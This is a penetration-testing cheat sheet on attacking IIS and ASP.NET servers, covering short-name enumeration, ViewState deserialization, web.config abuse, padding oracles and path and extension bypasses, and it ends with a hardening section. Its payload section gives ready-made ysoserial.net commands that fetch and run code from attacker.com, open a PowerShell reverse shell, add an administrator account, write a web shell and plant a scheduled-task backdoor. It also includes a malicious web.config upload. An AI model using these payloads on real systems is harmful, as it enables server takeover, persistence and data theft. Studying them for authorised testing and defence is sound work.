## 1. Overview

IIS (Internet Information Services) is Microsoft's web server platform with several unique security characteristics:

**Key Properties:**

- **Case Insensitive:** Path and file handling ignores case differences
- **Short Name Enumeration:** Legacy 8.3 filename format can leak file/directory names
- **ViewState Mechanism:** ASP.NET state management can be vulnerable to deserialization attacks
- **Web.config Exposure:** Configuration files may reveal sensitive information or be exploitable
- **Debug Mode Risks:** Detailed error messages expose full paths and stack traces
- **Common Debugging Tools:** ELMAH, Trace, and other diagnostic utilities often left deployed

## 2. Exploitation Methods

### 🔍 IIS Short Name Enumeration

**What It Does:** Exploits legacy 8.3 filename format to discover hidden files and directories

**Tools & Commands:**

```bash
# IIS-ShortName-Scanner (Java)
java -jar iis_shortname_scanner.jar 2 20 http://target.com

# shortscan (Go-based)
shortscan http://target.com

# sns (Modern alternative)
sns http://target.com
```

**Attack Steps:**

1. Test if server responds to tilde requests: `/admin~1/`
2. Enumerate short names systematically
3. Reconstruct full filenames from discovered patterns
4. Access sensitive files using discovered names

**Tools:**

- https://github.com/irsdl/IIS-ShortName-Scanner
- https://github.com/bitquark/shortscan
- https://github.com/sw33tLie/sns

---

### 🎯 ViewState Deserialization RCE

**What It Does:** Exploits insecure ViewState configuration to achieve remote code execution

**Prerequisites:**

- ViewState MAC validation disabled or weak key
- Knowledge of machineKey or ability to brute-force

**Attack Steps:**

1. **Identify ViewState Parameters:**
    
    - Look for `__VIEWSTATE` parameter in forms
    - Check if MAC validation is enabled
2. **Generate Malicious Payload:**
    
    ```bash
    # Using ysoserial.net
    ysoserial.exe -p ViewState -g TypeConfuseDelegate \
      -c "powershell.exe IEX..." --path="/vulnerable.aspx" \
      --apppath="/" --decryptionalg="AES" --decryptionkey="..." \
      --validationalg="HMACSHA256" --validationkey="..."
    ```
    
3. **Exploit with Blacklist3r:**
    
    - Automate ViewState exploitation
    - Test multiple gadget chains

**Resources:**

- https://github.com/pwntester/ysoserial.net
- https://www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/
- https://github.com/0xacb/viewgen

---

### 🔓 Web.config Exploitation

**Discovery Techniques:**

```bash
# Direct access attempts
https://target.com/web.config
https://target.com/.//WEB-INF/web.xml

# Case manipulation
https://target.com/WEB.CONFIG
https://target.com/Web.Config
```

**What to Extract:**

- Database connection strings
- machineKey values (for ViewState attacks)
- Authentication credentials
- API keys and secrets
- Custom error page configurations

**Upload Tricks:**

- Upload web.config to gain code execution
- Modify handler mappings
- Enable directory browsing
- Disable authentication

---

### 🛡️ Padding Oracle Attack

**Target:** ASP.NET's encrypted authentication cookies and ViewState

**Tools:**

```bash
# padding-oracle-attacker (Node.js)
npm install --global padding-oracle-attacker

# Decrypt encrypted data
padding-oracle-attacker decrypt hex:<encrypted_hex> [options]
padding-oracle-attacker decrypt b64:<encrypted_b64> [options]

# Encrypt arbitrary data
padding-oracle-attacker encrypt <plaintext> [options]
padding-oracle-attacker encrypt hex:<plaintext_hex> [options]

# Analyze encryption
padding-oracle-attacker analyze <url> [cookie] [options]

# pyOracle2 (Python alternative)
# https://github.com/liquidsec/pyOracle2
```

**Attack Process:**

1. Identify encrypted cookies or ViewState
2. Test for padding oracle vulnerability
3. Decrypt existing tokens to understand structure
4. Encrypt malicious payloads with elevated privileges

---

### ⚡ WebResource.axd Vulnerability (MS10-070)

**What It Does:** Exploits ScriptResource/WebResource handlers for information disclosure

**Check Script:**

```python
# https://github.com/inquisb/miscellaneous/blob/master/ms10-070_check.py
python ms10-070_check.py http://target.com
```

**Impact:**

- Read arbitrary files from web application
- Bypass authentication mechanisms
- Access source code

---

### 🔥 Telerik UI RCE

**Common Vulnerabilities:**

- Insecure Telerik.Web.UI.DialogHandler
- Unrestricted file upload via Telerik controls
- Cryptographic weaknesses in Telerik authentication

**Attack Pattern:**

1. Identify Telerik version from client-side resources
2. Search for known CVEs matching version
3. Exploit file upload or deserialization vulnerabilities
4. Achieve remote code execution

---

### 💥 Force Error Paths (Information Disclosure)

**Reserved Device Names:**

```bash
# Trigger errors to reveal paths and configurations
/con/
/aux/
/con.aspx
/aux.aspx
/prn/
/nul/
```

**What You Get:**

- Full application paths
- .NET framework version
- Detailed stack traces (if debug mode enabled)
- Application structure information

---

### 🌐 HTTP.sys & HTTPAPI 2.0 (IIS 7+)

**Common Issues:**

**404 Error Resolution:**

1. Capture legitimate Host header from subdomain
2. Modify Host header to correct subdomain value
3. Add entry to /etc/hosts if needed
4. Rescan target including Short Name enumeration

**HTTP.sys Vulnerabilities:**

- Denial of Service attacks
- Remote Code Execution (specific versions)
- Request smuggling opportunities

---

## 3. Bypasses

### Path Traversal Bypasses

```bash
# Double encoding
/.%252e/.%252e/
/..%255c..%255c

# Case variations (IIS is case insensitive)
/WEB-INF/web.xml
/web-inf/WEB.XML

# Unicode encoding
/.%c0%af../
```

### Authentication Bypasses

```bash
# Case manipulation
/Admin/ vs /admin/ vs /ADMIN/

# Path normalization
/app/../admin/
/./admin/
```

### File Extension Bypasses

```bash
# Append parsing confusion
shell.aspx;.jpg
shell.aspx:.jpg
shell.aspx::$DATA

# Case variations
shell.AsPx
shell.ASPX
```

## 4. Key Payloads

### ViewState RCE Payloads (Top 10)

```bash
# 1. PowerShell Download & Execute
ysoserial.exe -p ViewState -g TypeConfuseDelegate \
  -c "powershell -c IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/shell.ps1')"

# 2. Direct Command Execution
ysoserial.exe -p ViewState -g TypeConfuseDelegate \
  -c "cmd /c whoami > C:\\inetpub\\wwwroot\\out.txt"

# 3. Add Local Admin User
ysoserial.exe -p ViewState -g TypeConfuseDelegate \
  -c "net user hacker P@ssw0rd /add && net localgroup administrators hacker /add"

# 4. PowerShell Reverse Shell
ysoserial.exe -p ViewState -g TypeConfuseDelegate \
  -c "powershell -nop -c \"$client = New-Object Net.Sockets.TCPClient('attacker.com',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\""

# 5. File Write for Web Shell
ysoserial.exe -p ViewState -g TypeConfuseDelegate \
  -c "cmd /c echo ^<%@ Page Language=\"C#\" %>^<%@ Import Namespace=\"System.Diagnostics\" %>^<% Process.Start(Request[\"cmd\"]); %^> > C:\\inetpub\\wwwroot\\shell.aspx"

# 6. DNS Exfiltration Test
ysoserial.exe -p ViewState -g TypeConfuseDelegate \
  -c "nslookup vulnerable.attacker.com"

# 7. Base64 Encoded Command
ysoserial.exe -p ViewState -g TypeConfuseDelegate \
  -c "powershell -enc <base64_encoded_command>"

# 8. Scheduled Task Persistence
ysoserial.exe -p ViewState -g TypeConfuseDelegate \
  -c "schtasks /create /tn backdoor /tr C:\\backdoor.exe /sc onstart /ru System"

# 9. Download & Execute Binary
ysoserial.exe -p ViewState -g TypeConfuseDelegate \
  -c "certutil -urlcache -split -f http://attacker.com/payload.exe C:\\Windows\\Temp\\payload.exe && C:\\Windows\\Temp\\payload.exe"

# 10. WMIC Remote Execute
ysoserial.exe -p ViewState -g TypeConfuseDelegate \
  -c "wmic process call create 'cmd.exe /c powershell -c IEX...'"
```

### Web.config Upload Payloads

```xml
<!-- Enable ASP code execution in uploads directory -->
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="aspnet_handler" path="*.jpg" verb="*" 
              type="System.Web.UI.PageHandlerFactory" />
      </handlers>
   </system.webServer>
</configuration>
```

## 5. Higher Impact Scenarios

### 🚀 Privilege Escalation Chain

**Scenario:** ViewState RCE → Local Admin → Domain Compromise

**Steps:**

1. Exploit ViewState for initial code execution
2. Enumerate local privileges and stored credentials
3. Extract plaintext passwords from IIS application pools
4. Pivot to domain controller using stolen credentials
5. Achieve domain admin access

**Impact:** Complete network compromise

---

### 🔐 Authentication Bypass → Data Exfiltration

**Scenario:** Padding Oracle → Admin Cookie → Database Access

**Steps:**

1. Identify padding oracle in authentication cookie
2. Decrypt existing user cookie
3. Modify role claims to admin level
4. Encrypt malicious admin cookie
5. Access administrative database interfaces
6. Exfiltrate sensitive customer data

**Impact:** Complete data breach

---

### 🎭 Short Name → Hidden Admin Panel

**Scenario:** Short Name Enumeration → Undocumented Interface

**Steps:**

1. Enumerate short names to discover `ADMIN~1`
2. Reconstruct full path: `/AdminInterface/`
3. Discover default credentials in debug error messages
4. Access privileged administrative functions
5. Modify application configuration or create backdoors

**Impact:** Persistent administrative access

---

### ⚙️ Debug Mode → Source Code Disclosure

**Scenario:** Error Forcing → Stack Trace → Code Review → RCE

**Steps:**

1. Force errors using reserved device names
2. Analyze detailed stack traces for vulnerable code patterns
3. Identify SQL injection or deserialization sinks
4. Craft precise exploit based on source code knowledge
5. Achieve targeted remote code execution

**Impact:** Highly reliable exploitation

## 6. Mitigations

### 🛡️ ViewState Security

```xml
<!-- web.config hardening -->
<configuration>
  <system.web>
    <!-- Enable MAC validation -->
    <pages enableViewStateMac="true" 
           viewStateEncryptionMode="Always" />
    
    <!-- Use strong machineKey -->
    <machineKey validation="HMACSHA256" 
                validationKey="<long_random_key>"
                decryption="AES" 
                decryptionKey="<long_random_key>" />
  </system.web>
</configuration>
```

**Best Practices:**

- Always enable ViewState MAC validation
- Use strong, unique machineKey values per application
- Encrypt ViewState for sensitive data
- Consider disabling ViewState if not needed

---

### 🔒 Short Name Enumeration Prevention

**Registry Fix (Windows Server):**

```
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\FileSystem
NtfsDisable8dot3NameCreation = 1
```

**IIS Configuration:**

- Enable request filtering to block tilde characters
- Use URL rewrite rules to reject suspicious patterns
- Monitor for enumeration attempts in logs

---

### 🔐 Web.config Protection

**IIS Request Filtering:**

```xml
<system.webServer>
  <security>
    <requestFiltering>
      <hiddenSegments>
        <add segment="web.config" />
        <add segment="Web.config" />
        <add segment="WEB.CONFIG" />
      </hiddenSegments>
    </requestFiltering>
  </security>
</system.webServer>
```

**Additional Measures:**

- Use NTFS permissions to restrict web.config access
- Encrypt sensitive configuration sections
- Store secrets in Azure Key Vault or similar
- Never store credentials in web.config

---

### 🚫 Disable Debug Mode (Production)

```xml
<configuration>
  <system.web>
    <compilation debug="false" />
    <customErrors mode="On" defaultRedirect="~/Error.html">
      <error statusCode="404" redirect="~/NotFound.html" />
      <error statusCode="500" redirect="~/ServerError.html" />
    </customErrors>
  </system.web>
</configuration>
```

**Checklist:**

- [ ] Set `debug="false"` in compilation settings
- [ ] Enable custom error pages (mode="On")
- [ ] Remove ELMAH and Trace utilities from production
- [ ] Disable detailed error messages
- [ ] Remove debugging scripts and diagnostic tools

---

### 🛡️ Padding Oracle Prevention

**Framework Updates:**

- Patch to .NET Framework 4.5+ (includes mitigations)
- Apply all security updates for ASP.NET

**Configuration:**

```xml
<system.web>
  <httpRuntime enableVersionHeader="false" />
  <machineKey compatibilityMode="Framework45" />
</system.web>
```

---

### 🔧 General Hardening

**Headers:**

```xml
<system.webServer>
  <httpProtocol>
    <customHeaders>
      <remove name="X-Powered-By" />
      <add name="X-Frame-Options" value="SAMEORIGIN" />
      <add name="X-Content-Type-Options" value="nosniff" />
    </customHeaders>
  </httpProtocol>
</system.webServer>
```

**Security Checklist:**

- [ ] Remove server version headers
- [ ] Implement request filtering
- [ ] Use HTTPS exclusively
- [ ] Enable HSTS
- [ ] Regular security updates
- [ ] Principle of least privilege for app pool identities
- [ ] Regular security audits and penetration testing

---

**Pro Tip:** Every mitigation layered adds valuable defense depth! Stay proactive, test regularly, and keep systems updated! 🚀